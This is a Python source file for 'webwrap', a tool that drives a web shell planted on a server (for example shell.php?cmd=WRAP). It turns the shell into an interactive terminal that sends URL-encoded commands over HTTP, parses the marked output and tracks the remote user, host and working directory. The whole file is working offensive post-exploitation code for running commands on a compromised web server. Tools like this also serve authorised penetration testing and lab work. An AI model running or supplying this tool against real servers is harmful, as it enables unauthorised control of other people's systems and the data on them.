#!/usr/bin/env python3
"""
webwrap - Interactive web shell wrapper
Provides a pseudo-terminal interface for web-based command execution ..beta..
"""

import sys
import re
import urllib.parse
from pathlib import Path
from typing import Optional, Tuple

import httpx
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from rich.console import Console
from rich.text import Text

console = Console()

class WebShell:
    """Interactive web shell client"""
    
    MARKERS = {
        'start': ']LEDEBUT]',
        'end': ']LAFIN]'
    }
    
    def __init__(self, url: str, timeout: int = 30):
        if "WRAP" not in url:
            raise ValueError(
                "URL must contain 'WRAP' placeholder for command insertion\n"
                "Example: http://localhost:8000/shell.php?cmd=WRAP"
            )
        
        self.url = url
        self.client = httpx.Client(timeout=timeout, follow_redirects=True)
        self.session = PromptSession(history=InMemoryHistory())
        self.cwd: Optional[str] = None
        self.user: Optional[str] = None
        self.hostname: Optional[str] = None
        
    def _build_command(self, cmd: str) -> str:
        """Build command with markers and context"""
        parts = [
            f"echo -n '{self.MARKERS['start']}'",
        ]
        
        if self.cwd:
            parts.append(f"cd {self.cwd}")
            
        parts.extend([
            cmd,
            "echo $(whoami)[$(hostname)[$(pwd)",
            f"echo '{self.MARKERS['end']}'"
        ])
        
        return " ; ".join(parts) + " 2>&1"
    
    def _parse_response(self, text: str) -> Tuple[Optional[str], Optional[str]]:
        """Extract output and context from response"""
        pattern = re.escape(self.MARKERS['start']) + r'([\s\S]*)' + re.escape(self.MARKERS['end'])
        matches = re.findall(pattern, text)
        
        if not matches:
            return None, None
            
        content = matches[0]
        lines = content.split('\n')
        
        # Extract context from last line
        if len(lines) >= 2:
            context_line = lines[-2]
            parts = context_line.split('[')
            
            if len(parts) >= 3:
                self.user = parts[0]
                self.hostname = parts[1]
                self.cwd = parts[2]
                
                # Remove context line from output
                output = '\n'.join(lines[:-2])
                return output, context_line
        
        return content, None
    
    def _get_prompt(self) -> Text:
        """Generate colored prompt"""
        prompt = Text()
        
        if self.user and self.hostname:
            prompt.append(f"{self.user}@{self.hostname}", style="bold red")
            prompt.append(":", style="white")
            
        if self.cwd:
            prompt.append(self.cwd, style="bold cyan")
            
        prompt.append("$ ", style="white")
        return prompt
    
    def execute(self, cmd: str) -> Optional[str]:
        """Execute command and return output"""
        try:
            full_cmd = self._build_command(cmd)
            encoded = urllib.parse.quote(full_cmd)
            url = self.url.replace("WRAP", encoded)
            
            response = self.client.get(url)
            response.raise_for_status()
            
            output, _ = self._parse_response(response.text)
            return output
            
        except httpx.HTTPError as e:
            console.print(f"[red]HTTP Error:[/red] {e}")
            return None
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")
            return None
    
    def initialize(self) -> bool:
        """Initialize shell and get initial context"""
        console.print("[yellow]Initializing web shell...[/yellow]")
        
        output = self.execute("pwd")
        if output is None:
            console.print("[red]Failed to connect to web shell[/red]")
            return False
            
        console.print("[green]Connected![/green]\n")
        return True
    
    def run(self):
        """Run interactive shell loop"""
        if not self.initialize():
            return
        
        try:
            while True:
                try:
                    prompt = self._get_prompt()
                    cmd = self.session.prompt(prompt).strip()
                    
                    if not cmd:
                        continue
                        
                    if cmd in ('exit', 'quit'):
                        break
                    
                    output = self.execute(cmd)
                    if output:
                        console.print(output)
                        
                except KeyboardInterrupt:
                    console.print()
                    continue
                except EOFError:
                    break
                    
        finally:
            console.print("\n[cyan]Goodbye![/cyan]")
            self.client.close()


def main():
    """Main entry point"""
    if len(sys.argv) < 2:
        console.print(
            "\n[yellow]Usage:[/yellow] webwrap <URL>\n\n"
            "URL must contain 'WRAP' placeholder for command insertion\n"
            "[cyan]Example:[/cyan]\n"
            "  webwrap 'http://localhost:8000/shell.php?cmd=WRAP'\n"
        )
        sys.exit(1)
    
    try:
        shell = WebShell(sys.argv[1])
        shell.run()
    except ValueError as e:
        console.print(f"[red]Error:[/red] {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        console.print("\n[cyan]Goodbye![/cyan]")
        sys.exit(0)


if __name__ == "__main__":
    main()
